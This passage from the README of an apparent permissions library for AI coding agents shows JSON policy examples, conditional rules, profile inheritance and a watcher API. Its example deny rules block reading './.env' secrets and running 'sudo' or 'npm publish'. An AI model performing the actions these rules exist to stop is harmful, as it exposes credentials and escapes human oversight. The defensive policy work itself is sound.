| --------------------- | ------------------------------------------------------------------------------------------- |
| `--permission-prompt` | Expose the `permission_prompt` tool (see [Permission-prompt tool](#permission-prompt-tool)) |

## JSON Schema for IDE support

The schema is included in [SchemaStore](https://schemastore.org). Editors that support it (VS Code, JetBrains, neovim) will automatically provide autocomplete and validation for `.agents/permissions.json` and `.agents/permissions.local.json` files with no configuration.

To explicitly reference the schema:

```json
{
  "$schema": "https://github.com/Mearman/agent-permissions/releases/latest/download/agent-permissions.schema.json"
}
```

Or reference locally:

```json
{
  "$schema": "./node_modules/agent-perms/agent-permissions.schema.json"
}
```

The schema file ships with the package at `agent-perms/agent-permissions.schema.json`.

## Examples

### Minimal: allow safe tools, deny secrets

```json
{
  "rules": [
    { "tool": "Bash", "pattern": "git status", "tier": "allow" },
    { "tool": "Bash", "pattern": "git diff:*", "tier": "allow" },
    { "tool": "Read", "tier": "allow" },
    { "tool": "Grep", "tier": "allow" },
    { "tool": "Read", "pattern": "./.env", "tier": "deny" },
    { "tool": "Bash", "pattern": "sudo:*", "tier": "deny" }
  ]
}
```

### Personal overrides (`.agents/permissions.local.json`)

```json
{
  "rules": [
    { "tool": "Bash", "pattern": "python3:*", "tier": "allow" },
    { "tool": "Bash", "pattern": "docker:*", "tier": "allow" }
  ]
}
```

### Rules: unconditional deny

Rules without `when` always apply, regardless of cwd or branch:

```json
{
  "rules": [{ "tool": "Bash", "pattern": "npm publish:*", "tier": "deny" }]
}
```

### Rules: conditional (cwd/branch)

Rules with `when` only match when all conditions are met (AND logic):

```json
{
  "rules": [
    {
      "tool": "Bash",
      "pattern": "npm publish:*",
      "tier": "deny",
      "when": { "branch": "main", "cwd": "./packages/core" }
    }
  ]
}
```

Conditions available in `when`, all combined with AND:

| Condition | Matches                                                                                                                                                |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `cwd`     | Working directory, as a glob                                                                                                                           |
| `branch`  | Git branch, as a glob                                                                                                                                  |
| `env`     | Environment variables that must each equal the given value, as `{ "CI": "true" }`                                                                      |
| `remote`  | Git remote, as a glob against `host/path` in lower case; `git@github.com:Org/Repo.git` and `https://github.com/org/repo` both match `github.com/org/*` |

A key that is not one of these is a validation error, so a misspelled condition cannot silently leave a rule applying everywhere.

A condition on a field the evaluation context does not carry (no `cwd` or no `branch` supplied) is unknown, not satisfied. An unknown condition never lets an allow rule apply, and still lets a deny or ask rule apply, since the condition may hold. A definite mismatch on one condition settles the rule even if another condition is unknown.

### Watching for changes

A long-running host can follow the layer files instead of polling:

```typescript
import { watchPolicy } from "agent-perms/loader";
import type { PermissionPolicy } from "agent-perms/evaluate";

let policy: PermissionPolicy | undefined;
const watcher = watchPolicy(
  { cwd },
  (next) => {
    policy = next;
  },
  (error) => {
    console.error(error.message);
  },
);
// watcher.close() when done
```

`onChange` runs with the policy as it first loads, then again whenever a reload gives a different one, including when a layer file appears or disappears; a rewrite that leaves the policy unchanged reports nothing. Use the first report rather than a separate `loadPolicy`, which could miss a change made while the watch was starting. A layer file that exists but cannot be read, parsed or validated, an editor mid-write for instance, goes to `onError` as a `PolicyLoadError` and no policy is reported until every file loads again, because a policy missing that layer would be looser than the one in force.

### Profiles that extend profiles

A profile can build on others with `extends` and state only what differs:

```json
{
  "profiles": {
    "base": { "deny": ["Bash(sudo:*)"], "allow": ["Read", "Grep"] },
    "dev": { "extends": ["base"], "allow": ["Bash(npm run *)"] }
  },
  "activeProfile": "dev"
}
```

Extending only adds: a profile's lists are its parents' lists followed by its own, so a child cannot remove a restriction a parent set, and its default mode is its own or else the last parent's that sets one. A parent that does not exist, or profiles that extend each other in a cycle, fail validation. `resolveProfiles` flattens `extends`, and the Codex codec writes each profile with its parents' rules.

### Full policy with profiles, sandbox, per-agent overrides

See [`spec/examples/full.json`](spec/examples/full.json).

## Development

```bash
pnpm install          # Install dependencies
pnpm test             # Run tests
pnpm build            # Build ESM + CJS + types + JSON Schema
```

### Schema source of truth

The Zod schema in `src/schema.ts` is the single source of truth. The compiled JSON Schema (`agent-permissions.schema.json`) is generated via `z.toJSONSchema()`. Never edit it by hand.

### Adding a new agent codec

1. Define the agent's native schema in `src/compat/codecs.ts`
2. Implement `z.codec(nativeSchema, AgentPermissionPolicy, { decode, encode })`
3. Add round-trip tests in `src/test/compat.test.ts`
4. Register in the `CODECS` export
